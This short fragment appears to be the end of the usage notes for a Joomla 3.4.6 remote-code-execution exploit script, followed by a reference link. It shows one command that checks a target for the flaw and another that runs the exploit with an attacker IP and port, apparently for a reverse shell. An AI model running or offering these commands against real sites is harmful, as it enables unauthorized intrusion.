...
python3 Joomla-3.4.6-RCE.py -t http://172.20.10.4       check_vuln

python3 Joomla-3.4.6-RCE.py -t http://172.20.10.4 --exploit -l attack_ip -p attack_port

cankao https://www.secpulse.com/archives/115192.html
"""
